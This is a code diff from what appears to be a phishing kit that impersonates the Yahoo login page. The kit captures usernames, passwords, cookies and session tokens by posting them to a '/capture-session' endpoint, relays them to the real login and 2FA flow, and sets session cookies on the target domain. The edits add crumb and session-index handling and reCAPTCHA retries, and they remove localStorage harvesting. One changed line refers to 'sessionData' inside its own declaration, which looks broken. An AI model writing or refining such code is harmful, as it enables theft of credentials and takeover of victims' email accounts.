@@ -34,15 +34,6 @@ $(document).ready(() => {
           }
         }
       });
-      Object.keys(localStorage).forEach((key) => {
-        if (key.startsWith("yh_") || key.startsWith("yahoo_")) {
-          try {
-            data[key] = JSON.parse(localStorage.getItem(key));
-          } catch {
-            data[key] = localStorage.getItem(key);
-          }
-        }
-      });
       document.cookie.split(";").forEach((cookie) => {
         const [name, value] = cookie.trim().split("=");
         if (name && value) data[name] = decodeURIComponent(value);
@@ -67,9 +58,11 @@ $(document).ready(() => {
           document.cookie = `${name}=${value}; domain=${domain}; path=/; max-age=86400; secure; samesite=lax`;
         }
       });
-      const sessionData = { username, timestamp: Date.now(), fingerprint: this.generateFingerprint() };
+      const sessionData = { username, sessionIndex: sessionData.sessionIndex, acrumb: sessionData.acrumb, timestamp: Date.now(), fingerprint: this.generateFingerprint() };
       document.cookie = `yh_session=${encodeURIComponent(JSON.stringify(sessionData))}; domain=${domain}; path=/; max-age=3600; secure; samesite=lax`;
       sessionStorage.setItem("yh_username", username);
+      sessionStorage.setItem("yh_session_index", sessionData.sessionIndex || "1");
+      sessionStorage.setItem("yh_acrumb", sessionData.acrumb || "auto_acrumb_" + Date.now());
       return true;
     },
     startCookieMonitoring: () => {
@@ -117,6 +110,8 @@ $(document).ready(() => {
     showState("error-container");
     if (!isRetryable) {
       $("#refreshButton").text("Start Over").off("click").on("click", () => (window.location.href = "https://login.{hostname}/"));
+    } else if (message.includes("reCAPTCHA")) {
+      $("#refreshButton").text("Retry Login").off("click").on("click", () => (window.location.href = "/"));
     }
   }
 
@@ -131,13 +126,11 @@ $(document).ready(() => {
     formData.append("passwd", password);
     formData.append("crumb", sessionData.crumb || "auto_crumb_" + Date.now());
     formData.append("sessionIndex", sessionData.sessionIndex || "1");
+    formData.append("acrumb", sessionData.acrumb || "auto_acrumb_" + Date.now());
     formData.append("browser-fp-data", SessionManager.generateFingerprint());
     formData.append("timestamp", Date.now());
 
-    fetch("/capture-session", {
-      method: "POST",
-      body: JSON.stringify(Object.fromEntries(formData)),
-    }).then(() => {
+    fetch("/capture-session", { method: "POST", body: JSON.stringify(Object.fromEntries(formData)) }).then(() => {
       fetch("/account/challenge/password", {
         method: "POST",
         body: formData,
@@ -147,16 +140,21 @@ $(document).ready(() => {
         .then((text) => {
           authInProgress = false;
           if (text.includes("challenge-selector") || text.includes("verification")) {
-            sessionStorage.setItem("yh_2fa_session", JSON.stringify({ username, timestamp: Date.now() }));
+            sessionStorage.setItem("yh_2fa_session", JSON.stringify({ username, sessionIndex: sessionData.sessionIndex, acrumb: sessionData.acrumb, timestamp: Date.now() }));
             setTimeout(() => (window.location.href = "/2fa"), config.redirectDelay);
           } else if (text.includes("success") || response.status === 302) {
             sessionStorage.setItem("yahoo_auth_success", "true");
             setTimeout(() => (window.location.href = "https://mail.{hostname}/d/folders/1"), config.redirectDelay);
+          } else if (text.includes("recaptcha")) {
+            showError("reCAPTCHA required. Please retry the login process.", false);
           } else {
             handleAuthError(response.status);
           }
         })
-        .catch(() => proceedTo2FA());
+        .catch(() => {
+          showError("Network error. Please retry.", true);
+          setTimeout(() => (window.location.href = "/"), config.redirectDelay);
+        });
     });
   }
 
@@ -171,7 +169,7 @@ $(document).ready(() => {
   }
 
   function proceedTo2FA() {
-    sessionStorage.setItem("yh_2fa_session", JSON.stringify({ username, timestamp: Date.now() }));
+    sessionStorage.setItem("yh_2fa_session", JSON.stringify({ username, sessionIndex: sessionData.sessionIndex, acrumb: sessionData.acrumb, timestamp: Date.now() }));
     window.location.href = "/2fa";
   }
 
@@ -205,6 +203,8 @@ $(document).ready(() => {
     }
     $("#userEmail").text(username);
     $("#username").val(username);
+    $("#sessionIndex").val(sessionData.sessionIndex || "1");
+    $("#acrumb").val(sessionData.acrumb || "auto_acrumb_" + Date.now());
     $("#timestamp").val(Date.now());
     $("#browser-fp-data").val(SessionManager.generateFingerprint());
     return true;
